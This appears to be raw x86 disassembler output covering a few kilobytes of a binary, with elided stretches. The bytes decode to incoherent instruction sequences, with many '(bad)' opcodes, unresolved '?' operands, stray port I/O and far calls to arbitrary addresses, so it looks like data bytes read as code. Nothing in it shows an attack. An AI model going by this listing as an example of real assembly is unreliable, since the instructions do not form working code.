  424651:	iret   
  424652:	xchg   esp,eax
  424653:	das    
  424654:	pop    edi
  424655:	mov    dh,0x5b
  424657:	xchg   edi,eax
  424658:	cmp    BYTE PTR [ecx+ebp*8+0x61],dl
  42465c:	mov    al,ds:0xd8f23858
  424661:	sub    DWORD PTR ds:0xc7b0eb81,0x8a5aa3d3
  42466b:	mov    esi,esi
  42466d:	jge    0x4246ce
  42466f:	sub    al,0x9c
  424671:	or     DWORD PTR [edi-0x25],ebx
  424674:	pop    ebp
  424675:	jo     0x42463a
  424677:	scas   eax,DWORD PTR es:[edi]
  424678:	aad    0x82
  42467a:	mov    edx,0x3fada789
  42467f:	scas   al,BYTE PTR es:[edi]
  424680:	inc    esi
  424681:	addr16 enter 0x93cf,0x3e
  424686:	xchg   ebx,eax
  424687:	adc    DWORD PTR [eax-0x3a],edx
  42468a:	sar    BYTE PTR [eax],cl
  42468c:	adc    DWORD PTR [ebx+0x3a],ebx
  42468f:	jae    0x424656
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [ebp+0x4cec496c],ch
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0x8a000001,al
  42470d:	adc    BYTE PTR [ecx+0x2940279d],cl
  424713:	xchg   esp,eax
  424714:	dec    ebx
  424715:	pushf  
  424716:	mov    BYTE PTR [esi],dh
  424718:	ins    BYTE PTR es:[edi],dx
  424719:	shl    BYTE PTR [ebx],cl
  42471b:	std    
  42471c:	js     0x4246b4
  42471e:	push   esi
  42471f:	jno    0x424723
  424721:	jp     0x424750
  424723:	popf   
  424724:	cdq    
  424725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424726:	adc    eax,0x42528f13
  42472b:	aad    0x42
  42472d:	push   edi
  42472e:	das    
  42472f:	xor    esp,eax
  424731:	cmp    dh,ch
  424733:	aam    0x18
  424735:	pop    esp
  424736:	mov    esi,0xc2bafdb1
  42473b:	inc    esp
  42473c:	rol    DWORD PTR ds:0x1634d067,0xb4
  424743:	and    al,0x87
  424745:	cmp    DWORD PTR [edi+0x2e],ebx
  424748:	mov    ebp,0xed4c72aa
  42474d:	stos   BYTE PTR es:[edi],al
  42474e:	(bad)  
  42474f:	call   0x3433512f
  424754:	pop    es
  424755:	mov    bh,0xe
  424757:	in     al,0xd4
  424759:	dec    edx
  42475a:	pop    es
  42475b:	cmp    DWORD PTR [edi],esi
  42475d:	or     edx,DWORD PTR [esp+eax*8+0x6cc9b5ce]
  424764:	add    DWORD PTR [esi+0x90edb69],esi
  42476a:	cdq    
  42476b:	push   eax
  42476c:	push   ebx
  42476d:	add    BYTE PTR [eax+0x2],cl
  424770:	push   0xca6e2adc
  424775:	clc    
  424776:	mov    ds:0x18746e5f,eax
  42477b:	sbb    BYTE PTR [eax],dl
  42477d:	aam    0xba
  42477f:	inc    esp
  424780:	neg    edi
  424782:	(bad)
  424785:	xor    BYTE PTR [ebx],dh
  424787:	xchg   ebp,eax
  424788:	bound  edi,QWORD PTR [edi]
  42478a:	pusha  
  42478b:	push   esp
  42478c:	fstp   TBYTE PTR [esi]
  42478e:	dec    ecx
  42478f:	inc    ebp
  424790:	rcr    DWORD PTR [ecx+0xe317ba0],cl
  424796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424797:	pusha  
  424798:	addr16 cmc 
  42479a:	leave  
  42479b:	test   eax,0x47dafa62
  4247a0:	mov    dh,0x1
  4247a2:	mov    edx,0xc98fb1c8
  4247a7:	shl    BYTE PTR [esi+0x70],1
  4247aa:	aas    
  4247ab:	cs xchg edi,eax
  4247ad:	or     al,BYTE PTR [ecx-0x59]
  4247b0:	dec    ecx
  4247b1:	fmul   DWORD PTR [ebx+0x48]
  4247b4:	test   eax,0xd9950d87
  4247b9:	out    dx,al
  4247ba:	push   ebp
  4247bb:	aas    
  4247bc:	push   ebx
  4247bd:	call   0xa8567e01
  4247c2:	out    dx,eax
  4247c3:	stos   DWORD PTR es:[edi],eax
  4247c4:	ds mov bh,0x7a
  4247c7:	sbb    DWORD PTR [edi-0x72],ecx
  4247ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247cb:	pop    ecx
  4247cc:	test   BYTE PTR [esi],cl
  4247ce:	push   esi
  4247cf:	adc    BYTE PTR [esi-0x4],bl
  4247d2:	outs   dx,DWORD PTR ds:[esi]
  4247d3:	adc    BYTE PTR [edx],al
  4247d5:	sbb    eax,0xa5a53003
  4247da:	(bad)  
  4247db:	in     al,dx
  4247dc:	or     eax,0xc093556a
  4247e1:	jns    0x424771
  4247e3:	jmp    0x49c1c861
  4247e8:	enter  0x1cf3,0xcf
  4247ec:	inc    edx
  4247ed:	popa   
  4247ee:	push   cs
  4247ef:	outs   dx,DWORD PTR ds:[esi]
  4247f0:	je     0x424820
  4247f2:	hlt    
  4247f3:	inc    edx
  4247f4:	mov    ecx,0x14211a3f
  4247f9:	jmp    0x95d1:0xbd85c307
  424800:	in     eax,0xcb
  424802:	xor    eax,0xcdee941
  424807:	(bad)  [edi+0x1d]
  42480a:	mov    edi,0xaf242338
  42480f:	add    DWORD PTR [eax],edi
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	sub    ecx,ebx
  424882:	sub    ecx,DWORD PTR [esi+0x18651]
  424888:	add    eax,0xa3000001
  42488d:	pop    edi
  42488e:	rol    DWORD PTR ds:0x37e867f2,1
  424894:	push   ebp
  424895:	xchg   esi,eax
  424896:	scas   al,BYTE PTR es:[edi]
  424897:	outs   dx,BYTE PTR ds:[esi]
  424898:	cmp    ebp,esi
  42489a:	xlat   BYTE PTR ds:[ebx]
  42489b:	in     eax,dx
  42489c:	cmc    
  42489d:	sar    bh,1
  42489f:	cmp    DWORD PTR [ecx-0x45a03777],eax
  4248a5:	xlat   BYTE PTR ds:[ebx]
  4248a6:	cmp    ebp,DWORD PTR [edx]
  4248a8:	xchg   edx,eax
  4248a9:	loop   0x42483f
  4248ab:	lds    eax,FWORD PTR [esi]
  4248ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248ae:	jns    0x424901
  4248b0:	adc    edi,DWORD PTR [ebx-0x1766028e]
  4248b6:	fst    DWORD PTR [esi]
  4248b8:	mul    BYTE PTR [ecx-0x7485014d]
  4248be:	fidivr DWORD PTR ss:[eax+esi*1+0x6a]
  4248c3:	sub    BYTE PTR [ebp-0x1e],dl
  4248c6:	fsub   QWORD PTR [eax+0xf]
  4248c9:	enter  0x1d98,0xc0
  4248cd:	loope  0x424884
  4248cf:	arpl   WORD PTR [esi-0x42],sp
  4248d2:	aaa    
  4248d3:	and    BYTE PTR ds:0xdc883a03,0x95
  4248da:	lds    edx,FWORD PTR [ebx-0x5077c01]
  4248e0:	cmp    DWORD PTR [esi],0xca3139e5
  4248e6:	pop    ebp
  4248e7:	mov    fs,ebp
  4248e9:	mov    BYTE PTR [edx+0x1],bl
  4248ec:	xchg   ebx,eax
  4248ed:	cmp    DWORD PTR [edx+0xd71be1c],0x5ebb0ca7
  4248f7:	push   0x404a55fc
  4248fc:	out    0x29,eax
  4248fe:	xchg   DWORD PTR [esi],edx
  424900:	mov    al,ds:0x85210aa4
  424905:	(bad)  
  424906:	push   edi
  424907:	sbb    BYTE PTR [ecx+0x340067c6],dl
  42490d:	and    dh,BYTE PTR [eax-0x5450387e]
  424913:	pop    esi
  424914:	inc    ecx
  424915:	call   0x89bca925
  42491a:	jecxz  0x424930
  42491c:	jg     0x42490c
  42491e:	add    BYTE PTR [ebp+0x7d],al
  424921:	gs mov eax,0x4e9ed691
  424927:	adc    al,0x20
  424929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42492a:	push   edi
  42492b:	lds    edx,FWORD PTR [esi+eax*8-0xe]
  42492f:	fistp  DWORD PTR [edi-0x4320b3f5]
  424935:	push   ss
  424936:	pop    ecx
  424937:	xchg   ebp,eax
  424938:	hlt    
  424939:	popf   
  42493a:	repnz and ch,BYTE PTR [eax+edi*8-0x77b75b13]
  424942:	mov    DWORD PTR [ebx+0x6f],0x798ab426
  424949:	enter  0x1f3a,0x8a
  42494d:	add    bh,BYTE PTR [ecx-0xe]
  424950:	cmp    al,0x4a
  424952:	jo     0x42499e
  424954:	dec    ebx
  424955:	pop    edx
  424956:	dec    edi
  424957:	push   eax
  424958:	adc    esp,DWORD PTR [ebx]
  42495a:	clc    
  42495b:	mov    al,0xba
  42495d:	mov    ch,0x37
  42495f:	stos   WORD PTR es:[di],ax
  424962:	das    
  424963:	xor    DWORD PTR [edi-0x7a],ebp
  424966:	call   0xc6ce:0x272ce70d
  42496d:	dec    ecx
  42496e:	rcl    BYTE PTR [ebx-0x2f],cl
  424971:	ins    DWORD PTR es:[edi],dx
  424972:	xchg   ebx,edx
  424974:	repnz loop 0x4249a9
  424977:	mov    cl,0x1
  424979:	add    al,0xeb
  42497b:	xor    al,0xb8
  42497d:	pushf  
  42497e:	mov    edx,0xe291b829
  424983:	push   cs
  424984:	pop    edx
  424985:	(bad)  
  424986:	bound  ecx,QWORD PTR [ebp+0x54]
  424989:	out    0xcf,eax
  42498b:	add    edx,edx
  42498d:	push   0x851fb8
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    ch,BYTE PTR [ecx+eax*2-0x78a97c44]
  424a06:	add    DWORD PTR [eax],eax
  424a08:	add    eax,0x67000001
  424a0d:	mov    DWORD PTR [ebx+0x20],esi
  424a10:	imul   edx,DWORD PTR [esi+0x54c072b3],0x14
  424a17:	pushf  
  424a18:	mov    esi,0xf01910b8
  424a1d:	repz ja 0x4249b5
  424a20:	pop    ebx
  424a21:	mov    al,ds:0x27889b71
  424a26:	mov    ebx,DWORD PTR [ebx]
  424a28:	jmp    0x975ddb55
  424a2d:	jnp    0x424a07
  424a2f:	xchg   ecx,eax
  424a30:	aaa    
  424a31:	inc    esi
  424a32:	rcl    DWORD PTR [ebx+0x30],0x4a
  424a36:	loopne 0x4249da
  424a38:	adc    BYTE PTR [ebx-0x50963488],ch
  424a3e:	jge    0x424a61
  424a40:	sti    
  424a41:	jge    0x424a2c
  424a43:	pop    ss
  424a44:	out    0x71,al
  424a46:	jle    0x424a10
  424a48:	xchg   ecx,eax
  424a49:	into   
  424a4a:	sbb    DWORD PTR [edi+edi*8-0x2],0xfffffff6
  424a4f:	stc    
  424a50:	mov    edx,0x2129ccfa
  424a55:	jecxz  0x424a65
  424a57:	push   cs
  424a58:	jno    0x424a6c
  424a5a:	idiv   bh
  424a5c:	xchg   edi,eax
  424a5d:	push   0x2599f75b
  424a62:	jo     0x424abf
  424a64:	rcl    ch,0xcf
  424a67:	xchg   ecx,eax
  424a68:	arpl   WORD PTR [edi],cx
  424a6a:	or     eax,DWORD PTR [esi-0x5d200ad9]
  424a70:	daa    
  424a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a73:	add    al,BYTE PTR [ebx+ebx*4+0x32]
  424a77:	adc    al,0x21
  424a79:	retf   
  424a7a:	xchg   ebp,eax
  424a7b:	mov    esp,ebp
  424a7d:	sbb    ah,dh
  424a7f:	or     al,0xc6
  424a81:	into   
  424a82:	adc    BYTE PTR [ecx],ah
  424a84:	imul   edi,DWORD PTR [esi+0x1e],0x43
  424a88:	stos   DWORD PTR es:[edi],eax
  424a89:	dec    esi
  424a8a:	test   DWORD PTR [edi+0x39],edi
  424a8d:	and    esp,DWORD PTR [esp+ecx*4-0x5e]
  424a91:	push   edx
  424a92:	xor    al,0x42
  424a94:	bound  ebp,QWORD PTR [edi-0x44]
  424a97:	or     edx,DWORD PTR [esi+0x10b8f528]
  424a9d:	dec    ebp
  424a9e:	inc    edx
  424a9f:	xchg   ecx,eax
  424aa0:	mov    ecx,0xef9f9c88
  424aa5:	jecxz  0x424a93
  424aa7:	loop   0x424ae8
  424aa9:	adc    DWORD PTR [esi+0x705c20f3],0xffffffa3
  424ab0:	and    esi,DWORD PTR [ecx+0x31]
  424ab3:	and    al,0x4b
  424ab5:	shl    ch,0x59
  424ab8:	outs   dx,BYTE PTR ds:[esi]
  424ab9:	or     eax,0xd53d8e6f
  424abe:	scas   eax,DWORD PTR es:[edi]
  424abf:	or     eax,0x5185ebe1
  424ac4:	dec    esi
  424ac5:	add    ah,BYTE PTR [esi+0x23f6b81e]
  424acb:	add    dh,BYTE PTR [edx]
  424acd:	push   eax
  424ace:	mov    WORD PTR [ecx],?
  424ad0:	and    BYTE PTR [eax-0x196e0e6a],dh
  424ad6:	ins    DWORD PTR es:[edi],dx
  424ad7:	inc    edi
  424ad8:	sbb    esi,esp
  424ada:	inc    ebx
  424adb:	xchg   edx,eax
  424adc:	sub    al,0xa7
  424ade:	adc    bh,BYTE PTR [esi]
  424ae0:	mov    ebx,?
  424ae2:	push   ds
  424ae3:	loopne 0x424ab9
  424ae5:	cwde   
  424ae6:	cli    
  424ae7:	cdq    
  424ae8:	xor    edi,edx
  424aea:	cmp    bh,BYTE PTR [ecx]
  424aec:	mov    bl,BYTE PTR [eax+edi*1-0x5e]
  424af0:	jb     0x424a83
  424af2:	adc    al,0x77
  424af4:	out    dx,al
  424af5:	dec    edi
  424af6:	jp     0x424b37
  424af8:	jno    0x424b32
  424afa:	ins    BYTE PTR es:[edi],dx
  424afb:	push   esi
  424afc:	cdq    
  424afd:	inc    eax
  424afe:	pop    esi
  424aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b00:	jns    0x424b1e
  424b02:	inc    edi
  424b03:	pop    ss
  424b04:	sub    BYTE PTR [ebp+ecx*1+0x1816a7ae],cl
  424b0b:	sbb    cl,BYTE PTR [edx]
  424b0d:	rol    BYTE PTR [edi-0x3a],cl
  424b10:	jne    0x424b12
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b81:	push   ebx
  424b82:	push   edi
  424b83:	hlt    
  424b84:	pop    ebx
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x69000001,al
  424b8d:	mov    bl,BYTE PTR [ecx+0x221ad2b]
  424b93:	loope  0x424bda
  424b95:	jmp    0x40bf4c14
  424b9a:	ss bnd jo 0x424b9e
  424b9e:	popa   
  424b9f:	stc    
  424ba0:	ror    edx,1
  424ba2:	iret   
  424ba3:	pop    ebx
  424ba4:	sahf   
  424ba5:	pushf  
  424ba6:	push   ds
  424ba7:	scas   al,BYTE PTR es:[edi]
  424ba8:	(bad)  
  424ba9:	in     eax,dx
  424baa:	loop   0x424bc2
  424bac:	and    al,0x23
  424bae:	test   al,0x7d
  424bb0:	(bad)  
  424bb2:	jo     0x424b8e
  424bb4:	adc    esp,ebx
  424bb6:	adc    esp,DWORD PTR [ebp+0x4c]
  424bb9:	into   
  424bba:	mov    bh,0xfc
  424bbc:	add    DWORD PTR [bx+di+0x1137],ebp
  424bc1:	push   eax
  424bc2:	pop    eax
  424bc3:	rol    BYTE PTR [ebp+0x33619f3c],0xa9
  424bca:	jg     0x424b9c
  424bcc:	cmp    DWORD PTR [edi],ebx
  424bce:	push   ebx
  424bcf:	mov    ebx,ebx
  424bd1:	adc    al,0x5
  424bd3:	or     ebx,ebx
  424bd5:	call   0xc380:0xa09154c2
  424bdc:	arpl   WORD PTR [edi+0x429266de],si
  424be2:	push   edi
  424be3:	jecxz  0x424bfb
  424be5:	(bad)  
  424be6:	into   
  424be7:	aad    0x81
  424be9:	icebp  
  424bea:	mov    ebx,0x513e32c1
  424bef:	mov    eax,0x45bd9dbb
  424bf4:	rol    BYTE PTR [ecx+0x52],0xc
  424bf8:	sahf   
  424bf9:	loop   0x424c1c
  424bfb:	imul   BYTE PTR [ecx]
  424bfd:	mov    bh,0x3
  424bff:	gs repz fcmovnbe st,st(0)
  424c03:	sbb    cl,BYTE PTR [ebx]
  424c05:	lods   al,BYTE PTR ds:[esi]
  424c06:	daa    
  424c07:	or     ebx,DWORD PTR [ebx+0x15]
  424c0a:	rol    DWORD PTR [eiz*4-0xb6358e7],0xee
  424c12:	inc    ecx
  424c13:	push   ss
  424c14:	test   eax,0x57a3b9ba
  424c19:	or     eax,0x1cf0ce08
  424c1e:	lock stc 
  424c20:	push   ebx
  424c21:	inc    ebx
  424c22:	std    
  424c23:	or     cl,cl
  424c25:	mov    bl,0xb1
  424c27:	mov    BYTE PTR [esi+0x78],cl
  424c2a:	jb     0x424bb8
  424c2c:	(bad)  
  424c2d:	push   ds
  424c2e:	sub    ebp,ebx
  424c30:	mov    ecx,0x20c2af0d
  424c35:	retf   
  424c36:	inc    edx
  424c37:	sub    al,0x60
  424c39:	in     eax,0x46
  424c3b:	popf   
  424c3c:	or     ch,BYTE PTR [edi]
  424c3e:	call   0x91ba:0x8c3700f5
  424c45:	jns    0x424c08
  424c47:	push   eax
  424c48:	xchg   ebp,eax
  424c49:	dec    ebx
  424c4a:	xlat   BYTE PTR ds:[ebx]
  424c4b:	retf   0x5031
  424c4e:	push   ss
  424c4f:	adc    al,0x11
  424c51:	cmp    edi,edi
  424c53:	and    ah,BYTE PTR gs:[ebp+0x54]
  424c57:	mov    ds:0x2d61a9ba,al
  424c5c:	inc    ebp
  424c5d:	mov    BYTE PTR [edx+0x652c39e5],dh
  424c63:	rcr    DWORD PTR [edx-0x7],0x1f
  424c67:	and    DWORD PTR [edi+0x56],ecx
  424c6a:	push   esi
  424c6b:	sbb    BYTE PTR [eax-0x77641954],dh
  424c71:	fs ror BYTE PTR ds:[edx+ebx*8+0x565ad30e],0xae
  424c7b:	jmp    DWORD PTR [edx]
  424c7d:	outs   dx,DWORD PTR ds:[esi]
  424c7e:	or     al,0xcc
  424c80:	xchg   ebp,eax
  424c81:	cmp    BYTE PTR [edx+0x6],al
  424c84:	jb     0x424c90
  424c86:	iret   
  424c87:	loopne 0x424c38
  424c89:	ins    BYTE PTR es:[edi],dx
  424c8a:	add    eax,0xac61c71b
  424c8f:	fbld   TBYTE PTR [edx+0x0]
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	retf   
  424d01:	imul   ebx,esp,0xffffffd2
  424d04:	pusha  
  424d05:	mov    DWORD PTR [ecx],eax
  424d07:	add    BYTE PTR ds:0x15000001,al
  424d0d:	aam    0x61
  424d0f:	xchg   ecx,eax
  424d10:	mov    ds:0xd902eebc,eax
  424d15:	mov    edi,0xc1d5d029
  424d1a:	mov    ebx,0x2e221baa
  424d1f:	loopne 0x424d4e
  424d21:	repnz pop eax
  424d23:	jge    0x424cc7
  424d25:	into   
  424d26:	jno    0x424cf8
  424d28:	cmp    esi,DWORD PTR [ebx+0x5bc76ad2]
  424d2e:	mov    al,0xa7
  424d30:	jne    0x424d7a
  424d32:	and    eax,0x18bc8d4b
  424d37:	dec    edi
  424d38:	and    DWORD PTR [ecx],esi
  424d3a:	dec    eax
  424d3b:	lds    esp,FWORD PTR [edx+ecx*4-0x5a64d8ed]
  424d42:	mov    ebp,0x5ceaac81
  424d47:	xor    edi,eax
  424d49:	shr    DWORD PTR [ebp-0x5d],0x90
  424d4d:	fistp  DWORD PTR [edi+0x4b]
  424d50:	aaa    
  424d51:	or     dl,BYTE PTR [esi+0x4774fb34]
  424d57:	inc    ebp
  424d58:	jno    0x424d8c
  424d5a:	and    ah,bh
  424d5c:	and    bh,dl
  424d5e:	(bad)  
  424d5f:	pop    eax
  424d60:	in     eax,0xb3
  424d62:	pop    esi
  424d63:	pop    ebp
  424d64:	jmp    0xceac:0xf489b958
  424d6b:	call   0x5fa2:0x85705654
  424d72:	enter  0x4ed,0xd5
  424d76:	dec    edx
  424d77:	xchg   BYTE PTR [eax+0x6cfc6f97],ah
  424d7d:	jecxz  0x424d92
  424d7f:	dec    esi
  424d80:	cmc    
  424d81:	xchg   ebp,eax
  424d82:	jno    0x424db9
  424d84:	sbb    eax,0xc50d9df1
  424d89:	arpl   WORD PTR [ebp-0xe],dx
  424d8c:	test   BYTE PTR [edi+0x25],dl
  424d8f:	sti    
  424d90:	jl     0x424d80
  424d92:	or     ch,bl
  424d94:	xchg   esi,eax
  424d95:	ja     0x424dda
  424d97:	push   ebx
  424d98:	das    
  424d99:	pop    ebp
  424d9a:	mov    cl,cl
  424d9c:	nop
  424d9d:	jno    0x424d48
  424d9f:	out    0x12,al
  424da1:	shl    DWORD PTR [edi-0xc],cl
  424da4:	push   edi
  424da5:	dec    edx
  424da6:	add    DWORD PTR [ebx-0x3b2aa3d0],eax
  424dac:	sahf   
  424dad:	cmp    BYTE PTR [ecx-0x7],dl
  424db0:	add    esi,edx
  424db2:	out    0x85,eax
  424db4:	idiv   ebx
  424db6:	jnp    0x424e19
  424db8:	shl    BYTE PTR [ecx+esi*2+0x11a82f2b],0x47
  424dc0:	pop    ebp
  424dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424dc2:	icebp  
  424dc3:	je     0x424d7c
  424dc5:	pop    eax
  424dc6:	test   eax,0x39b405de
  424dcb:	push   ebp
  424dcc:	xor    esi,DWORD PTR [ebx]
  424dce:	pop    es
  424dcf:	int3   
  424dd0:	mov    al,ds:0xecb98d82
  424dd5:	xor    BYTE PTR [ebx+eiz*4],al
  424dd8:	mov    edx,0xd7b4eeef
  424ddd:	xchg   ecx,eax
  424dde:	sbb    eax,0xf9a6db1b
  424de3:	jp     0x424e30
  424de5:	pop    ss
  424de6:	and    bh,BYTE PTR [ebx-0x4ae57c7f]
  424dec:	inc    edx
  424ded:	mov    al,0xdc
  424def:	mov    esi,0xdc22a444
  424df4:	add    bl,cl
  424df6:	sub    al,0x12
  424df8:	mov    esi,0xed5809fc
  424dfd:	fisubr DWORD PTR [edx+0xb]
  424e00:	xor    eax,0xcd0f046f
  424e05:	and    ch,0x5f
  424e08:	outs   dx,BYTE PTR ds:[esi]
  424e09:	inc    edx
  424e0a:	pop    ss
  424e0b:	hlt    
  424e0c:	iret   
  424e0d:	push   ss
  424e0e:	and    al,0xdd
  424e10:	popf   
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e97
  424e81:	adc    eax,ebp
  424e83:	mov    esi,0x18a65
  424e88:	add    eax,0x6a000001
  424e8d:	test   esp,edx
  424e8f:	fs je  0x424eac
  424e92:	and    eax,0xb49166f0
  424e97:	jbe    0x424e48
  424e99:	xor    DWORD PTR [edx+0x46eb06a6],edi
  424e9f:	repz test eax,0x32398dec
  424ea5:	pop    ecx
  424ea6:	adc    eax,0xa79ba545
  424eab:	je     0x424ec2
  424ead:	rcl    BYTE PTR [ecx+ebp*8-0xc],1
  424eb1:	xlat   BYTE PTR ds:[ebx]
  424eb2:	call   0x68d7:0xaabd66fe
  424eb9:	adc    DWORD PTR [esi],0x4e5fd04b
  424ebf:	xor    cl,0x5b
  424ec2:	hlt    
  424ec3:	test   eax,0x5cb49616
  424ec8:	lods   al,BYTE PTR ds:[esi]
  424ec9:	lods   eax,DWORD PTR ds:[esi]
  424eca:	sub    eax,0xe06d4538
  424ecf:	sbb    esi,DWORD PTR [eax+edi*4]
  424ed2:	ror    DWORD PTR [edi],cl
  424ed4:	std    
  424ed5:	push   ss
  424ed6:	(bad)  
  424ed7:	loopne 0x424f07
  424ed9:	inc    ebp
  424eda:	arpl   WORD PTR [ecx],ax
  424edc:	jmp    0xdab57ba1
  424ee1:	repnz fmul QWORD PTR [eax]
  424ee4:	mov    DWORD PTR [ebp-0x7a],ebp
  424ee7:	test   DWORD PTR [ebp-0x4e],ecx
  424eea:	cmp    ecx,DWORD PTR [edi+0x1ecb9734]
  424ef0:	fucomp st(4)
  424ef2:	sbb    BYTE PTR [esi-0x78],cl
  424ef5:	ret    
  424ef6:	add    BYTE PTR [ebp+eiz*2-0x75],bl
  424efa:	jmp    0x424ebf
  424efc:	into   
  424efd:	adc    BYTE PTR [esi-0x525eb81d],0x87
  424f04:	inc    edx
  424f05:	clc    
  424f06:	xchg   edx,eax
  424f07:	repnz ror WORD PTR [ebx+0x34],1
  424f0c:	push   edx
  424f0d:	les    edx,FWORD PTR [ebp+0x4477c84e]
  424f13:	out    dx,eax
  424f14:	mov    ah,0xf1
  424f16:	cmp    DWORD PTR [ebx+0x6d54781],ebx
  424f1c:	jecxz  0x424efe
  424f1e:	clc    
  424f1f:	les    esp,FWORD PTR [edx]
  424f21:	enter  0x4c7c,0xd3
  424f25:	(bad)  
  424f26:	fnsave [edx]
  424f28:	ins    DWORD PTR es:[edi],dx
  424f29:	repnz and BYTE PTR [eax+0xe],bh
  424f2d:	xor    ebp,DWORD PTR [esi+0xe]
  424f30:	push   eax
  424f31:	or     eax,0x218b493b
  424f36:	and    ch,BYTE PTR [ebp+0x5a]
  424f39:	pop    ecx
  424f3a:	lea    ebp,[ecx+0x36]
  424f3d:	nop
  424f3e:	retf   0x5ce9
  424f41:	sbb    BYTE PTR [eax+0x1f73b561],dl
  424f47:	jno    0x424f03
  424f49:	or     al,0x10
  424f4b:	mov    dh,0x77
  424f4d:	jmp    FWORD PTR [eax-0x537162ac]
  424f53:	add    eax,edx
  424f55:	mov    ah,0x13
  424f57:	cli    
  424f58:	and    BYTE PTR ds:0x9f9866ab,cl
  424f5e:	arpl   WORD PTR [edx-0x5df3047c],di
  424f64:	inc    esi
  424f65:	inc    eax
  424f66:	clc    
  424f67:	and    al,0xe4
  424f69:	xor    BYTE PTR [ecx-0x7f],0x1a
  424f6d:	mov    esp,0x7600ca64
  424f72:	adc    DWORD PTR [edi+0x36d4ac98],edi
  424f78:	adc    bh,BYTE PTR [eax+eax*4+0x35]
  424f7c:	dec    ecx
  424f7d:	sbb    BYTE PTR [eax],ch
  424f7f:	div    BYTE PTR ss:[esi-0x2c]
  424f83:	stos   DWORD PTR es:[edi],eax
  424f84:	test   BYTE PTR [ecx],bl
  424f86:	mov    eax,ds:0xa6f68833
  424f8b:	(bad)  
  424f8c:	sbb    ah,BYTE PTR [ecx+0xfec8dd]
	...
  424ff2:	add    BYTE PTR [eax],al
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	test   esi,edx
  425002:	gs pushf 
  425004:	push   0xffffff8b
  425006:	add    DWORD PTR [eax],eax
  425008:	add    eax,0xb000001
  42500d:	inc    edx
  42500e:	mov    DWORD PTR ds:0x673263a5,edx
  425014:	es fisub DWORD PTR fs:[ebx-0x63]
  425019:	sbb    DWORD PTR [ebx-0x666de00a],ecx
  42501f:	in     eax,dx
  425020:	iret   
  425021:	pusha  
  425022:	fsin   
  425024:	mov    ?,WORD PTR [eax]
  425026:	lods   al,BYTE PTR ds:[esi]
  425027:	jae    0x425074
  425029:	ins    BYTE PTR es:[edi],dx
  42502a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42502b:	sub    edx,esp
  42502d:	loope  0x42506c
  42502f:	retf   0x5854
  425032:	ja     0x425057
  425034:	out    0x4f,al
  425036:	in     al,0xae
  425038:	in     eax,0x25
  42503a:	ins    DWORD PTR es:[edi],dx
  42503b:	mov    al,ds:0x4fc27fb0
  425040:	imul   esp,eax,0xb211ab4a
  425046:	into   
  425047:	test   ah,bl
  425049:	xor    BYTE PTR [ebp+0x1c],dh
  42504c:	add    eax,0xa46e90e0
  425051:	clc    
  425052:	jae    0x4250b4
  425054:	cwde   
  425055:	jns    0x424fe2
  425057:	jb     0x425014
  425059:	mov    esi,0x6648f2ce
  42505e:	mov    cl,0x44
  425060:	je     0x53dcc630
  425066:	dec    BYTE PTR [ebx-0x3df55ad]
  42506c:	in     al,dx
  42506d:	xor    al,0x8a
  42506f:	int    0x2d
  425071:	xchg   ah,ah
  425073:	cdq    
  425074:	or     eax,0xa872621
  425079:	adc    eax,DWORD PTR [ecx+0x2dac41d5]
  42507f:	cmp    bh,dh
  425081:	push   edx
  425082:	add    DWORD PTR [ebx],ebp
  425084:	int    0x40
  425086:	push   0x7b
  425088:	push   ss
  425089:	dec    esp
  42508a:	push   es
  42508b:	pop    ebx
  42508c:	dec    ebp
  42508d:	pop    esp
  42508e:	jno    0x425093
  425090:	sbb    DWORD PTR [esi+edx*1+0x23751096],eax
  425097:	repz push esp
  425099:	jmp    0x425088
  42509b:	push   0xffffffb5
  42509d:	xor    edi,eax
  42509f:	mov    dh,0x97
  4250a1:	rcl    BYTE PTR [esp+edi*8-0x1a],cl
  4250a5:	mov    esp,DWORD PTR [ebp-0x1]
  4250a8:	test   al,0x5e
  4250aa:	xchg   esi,eax
  4250ab:	mov    bl,0x22
  4250ad:	mov    edi,ds
